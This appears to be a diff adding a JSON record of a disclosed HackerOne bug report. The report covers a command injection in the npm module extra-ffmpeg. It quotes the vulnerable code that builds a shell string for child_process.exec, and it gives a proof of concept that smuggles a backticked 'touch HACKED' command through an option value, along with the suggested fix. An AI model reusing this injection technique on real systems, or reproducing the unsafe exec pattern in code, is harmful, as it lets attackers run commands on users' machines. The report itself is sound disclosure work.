@@ -1,0 +1,122 @@
+{
+  "id": 863944,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjM5NDQ=",
+  "url": "https://hackerone.com/reports/863944",
+  "title": "[extra-ffmpeg] Command Injection via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-01T11:15:06.209Z",
+  "submitted_at": "2020-05-01T11:15:06.209Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-08-20T09:08:41.263Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-20T09:08:41.211Z",
+  "team_member_agreed_on_going_public_at": "2020-07-25T19:04:18.662Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `Command Injection` issue in the `extra-ffmpeg` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `extra-ffmpeg`\n**version:** `4.0.3`\n**npm page:** `https://www.npmjs.com/package/extra-ffmpeg`\n\n## Module Description\n\nDecode, encode, transcode, mux, demux, stream, filter, and play media through machine (via \"ffmpeg\").\n\n## Module Stats\n\n[99] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/nodef/extra-ffmpeg/blob/master/index.js#L19\nconst cp = require('child_process');\n\n\n// Global variables.\nconst STDIO = [0, 1, 2];\n\n\n // Generate command for ffmpeg.\n function command(os) {\n  var z = 'ffmpeg';\n  var os = os||[];\n  for(var o of os) {\n    var o = o||{};\n    for(var k in o) {\n      if(o[k]==null) continue;\n      if(k==='stdio') continue;\n      if(k==='o' || k==='outfile') z += ` \"${o[k]}\"`;\n      else if(typeof o[k]==='boolean') z += o[k]? ` -${k}`:'';\n      else z += ` -${k} ${JSON.stringify(o[k])}`;  // <-- injection\n    }\n  }\n  return z;\n};\n\n/**\n * Invoke \"ffmpeg\" synchronously.\n * @param {object} os ffmpeg options.\n */\nfunction sync(os) {\n  var stdio = os.stdio===undefined? STDIO:os.stdio;\n  return cp.execSync(command(os), {stdio});\n};\n\n/**\n * Invoke \"ffmpeg\" asynchronously.\n * @param {object} os ffmpeg options.\n */\nfunction ffmpeg(os) {\n  var stdio = os.stdio===undefined? STDIO:os.stdio;\n  return new Promise((fres, frej) => cp.exec(command(os), {stdio}, (err, stdout, stderr) => {\n    if(err) frej(err);\n    else fres({stdout, stderr});\n  }));\n};\nffmpeg.sync = sync;\nmodule.exports = ffmpeg;\n```\nThe `os` parameter contains the option parameters for the command `ffmpeg`. \nThe final command that is passed to the `child_process.exec` function is built formatting the options value without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `extra-ffmpeg` module:\n    -  `npm i extra-ffmpeg`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst ffmpeg = require('extra-ffmpeg');\nffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F810821}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `extra-ffmpeg` module via insecure command formatting.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 810821,
+      "file_name": "poc_extra-ffmpeg.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zYRYw2z2F7JT8yUAmnv3NYsS?response-content-disposition=attachment%3B%20filename%3D%22poc_extra-ffmpeg.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_extra-ffmpeg.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG7L5HA3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151751Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDwzDLOW%2BGPNuLAtMDJB7rzjUJqhrWrXrg24FMvgwXjTAIhAPsIQv7gTxikLkRRR%2Bfmgc6%2FEBflqDw6mFU8F23MVlzwKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz2zCFdGB%2FM4GpoFlwqjgU6mSatW5nOxaNjLpzrMm02KJaMwjC59bgeMmtt0xY0ccLDzHWbIVeXIV%2F9v%2FC16YUKAPslTq4ZM%2FgoFTRGQeLSGqjAI9Rc4T2olc4L9Cbuw58d80jHDppF43gC3Z6Tg4KAwNjY4%2BVWMVQk3OmtEsGVuebUD5vzTtnBIILLxshyRo90qVmhqVBD8dL5NCj7fIco7FllwPXW8sgcfivHiD9G01U44H81zX%2F804ica%2Bjg%2Ft4JqlLFS4k%2BajayLLwOoAlEWff528B55SQoMBImXdoE2xgb7Wd2T303TgmS%2BlI9SwukXnordnBAl7wFwHkPl2PGrN2SH8chC%2BiNVKSFkzWzeT9xcj0MTNmj7zSPcH7AaYJ1rxS6Lj6ijXsZjfM67fxjMEOpXVc8LwQiV%2Fb8PoXNCS%2FyhkdEd6whDziXsoSv9qg20p6zlIOooSZMvcrMxJMSpI9MZbYMhT3VMNvdi8NKrYSHBgtlL0UwE6L5%2FNRPXeFGRFcHZmJBZO%2BoMmi2ufPTMBOD5nwO56my1cioF%2Bacii98Qn9%2BJAEe6xjd4XRESTqxZ9jczXCNP6mF1w%2Bf3SOKC%2FEZW0TTd5j404SgmVv1G86XUA0lW8%2BiscT0RjnUwl%2Bfgvcx%2FWOK%2BogSr641xpKgvm5JoNRiCH955yC4inks7YqAOhoVYnc46Fagrmc%2BQGqBJRbCai7uH9KvqIIhf9%2F9zIzt4jT1dRL9JfNSU6i9Ofp1eBoupvEb1EkuvFdhmptYRvvwHxMLLzjUvi5uiqhsWtqU%2F3KRBZPMvDItiTCOH5CibGCaAd5v0NzXg2JIrcACHLFJVpxvfBHjxL%2BRb%2F7o1BhFcRgcMBl7T16%2B4Wuw%2Bc86v%2FeadLVXYxsYjUcw7Y%2F9zwY6sAF4X1TISJq75cB44X2Lq1i0JZ3M94EBr1cAv6RpxkNsVW%2Br28TpbOuHsOTzLoMX2EBa5Cz9Wum%2FfTEpFCmE74E%2F4rRzRstJnEOIr1xkggMM6Yj1gZEK36z53xHkG0NN8E3EqQL9EYhhDj9mpCdfCkpse5tLMRzmHW3jIKq2FDfi%2FFTnjar8G1wa82ZVdjklmUvT293j2G46iMoYUoPRIj4IfOLk7Fuo8H2RJf3EuU7ibQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f1bc850876f8961a25b905363db46f7f9c06f1bdb8bb5fd2c788f45c43cfd654",
+      "file_size": 4521615,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-24T19:04:18.884Z",
+  "allow_singular_disclosure_after": -180044012.56927928,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
